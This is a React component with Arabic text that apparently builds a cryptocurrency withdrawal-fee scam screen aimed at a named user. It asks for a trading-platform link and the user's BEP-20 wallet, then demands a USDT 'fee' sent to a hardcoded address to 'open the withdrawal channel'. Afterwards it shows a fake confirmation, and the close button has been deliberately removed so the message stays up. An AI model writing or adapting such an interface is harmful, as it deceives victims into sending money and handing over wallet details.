
import React, { useState } from 'react';
import { Copy, CheckCircle2, Loader2, Info } from 'lucide-react';

type ModalStep = 1 | 2 | 3 | 4;

const TaskModal: React.FC = () => {
  const [step, setStep] = useState<ModalStep>(1);
  const [copied, setCopied] = useState(false);
  const [platformLink, setPlatformLink] = useState('');
  const [walletAddress, setWalletAddress] = useState('');

  const targetAddress = "0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d";

  const handleCopy = () => {
    navigator.clipboard.writeText(targetAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const nextStep = () => {
    setStep((prev) => (prev + 1) as ModalStep);
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6">
      {/* Blurry Backdrop */}
      <div className="absolute inset-0 bg-black/40 backdrop-blur-[4px]" />

      {/* Modal Container */}
      <div className="relative w-full max-w-sm bg-white rounded-[32px] shadow-2xl overflow-hidden animate-in fade-in zoom-in duration-300">
        <div className="p-8 flex flex-col items-center text-center">
          
          {step === 1 && (
            <div className="space-y-6 w-full">
              <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-2 mx-auto">
                <CheckCircle2 className="text-blue-500" size={32} />
              </div>
              <h2 className="text-xl font-bold text-gray-800 leading-relaxed" dir="rtl">
                أهلاً بك Basil3216260
              </h2>
              <p className="text-gray-600 leading-relaxed" dir="rtl">
                تم حل أمر المهام. اضغط التالي وقم بوضع رابط المنصة <span className="font-bold text-blue-600">mini pro</span> لقسم الإيداع حصراً.
              </p>
              <input 
                type="text"
                placeholder="رابط المنصة"
                className="w-full px-4 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none text-right transition-all"
                dir="rtl"
                value={platformLink}
                onChange={(e) => setPlatformLink(e.target.value)}
              />
              <button 
                onClick={nextStep}
                className="w-full bg-[#3a82f6] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-100 active:scale-[0.98] transition-all"
              >
                التالي
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-6 w-full">
              <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-2 mx-auto">
                <Info className="text-blue-500" size={32} />
              </div>
              <h2 className="text-xl font-bold text-gray-800" dir="rtl">
                رابط المحفظة
              </h2>
              <p className="text-gray-600" dir="rtl">
                يرجى وضع رابط محفظة BEP-20 الخاصة بك:
              </p>
              <input 
                type="text"
                placeholder="رابط محفظة BEP-20"
                className="w-full px-4 py-3.5 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none text-right transition-all"
                dir="rtl"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
              />
              <button 
                onClick={nextStep}
                className="w-full bg-[#3a82f6] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-100 active:scale-[0.98] transition-all"
              >
                التالي
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-5 w-full">
              <h2 className="text-xl font-bold text-gray-800" dir="rtl">
                اهلا بك Basil3216260
              </h2>
              <div className="bg-amber-50 p-5 rounded-2xl border border-amber-100 text-sm text-amber-900 leading-relaxed shadow-sm" dir="rtl">
                بقي أمر إيداع مبلغ <span className="font-bold text-amber-600 text-lg">0 USDT (BEP-20)</span> لفتح قناة السحب. 
                هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
              </div>
              
              <div className="w-full space-y-2">
                <p className="text-xs text-gray-400 font-bold text-right px-1">عنوان المحفظة للتحويل:</p>
                <div className="flex items-center gap-2 bg-gray-50 p-3.5 rounded-2xl border border-dashed border-gray-300">
                  <button onClick={handleCopy} className="p-2.5 bg-white rounded-xl shadow-sm active:scale-90 transition-all hover:bg-gray-50">
                    {copied ? <CheckCircle2 size={18} className="text-green-500" /> : <Copy size={18} className="text-gray-500" />}
                  </button>
                  <span className="text-[10px] font-mono break-all text-gray-600 select-all flex-1 text-left">{targetAddress}</span>
                </div>
              </div>

              <button 
                onClick={nextStep}
                className="w-full bg-[#50cf96] text-white font-bold py-4 rounded-2xl shadow-lg shadow-green-100 active:scale-[0.98] transition-all"
              >
                تم الإيداع
              </button>
            </div>
          )}

          {step === 4 && (
            <div className="space-y-6 py-6 w-full flex flex-col items-center">
              <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mb-2 animate-bounce">
                <CheckCircle2 className="text-green-500" size={48} />
              </div>
              <div className="space-y-4">
                <h3 className="text-xl font-bold text-gray-800" dir="rtl">تم التأكد بنجاح</h3>
                <p className="text-gray-600 leading-relaxed text-[15px] font-medium" dir="rtl">
                  سيتم فتح قناة السحب خلال 48 ساعه قم بالرجوع إلى هنا كل ساعه سيختفي هذا الأشعار عند فتح القناة
                </p>
              </div>
              {/* Button removed to keep the notification persistent */}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default TaskModal;
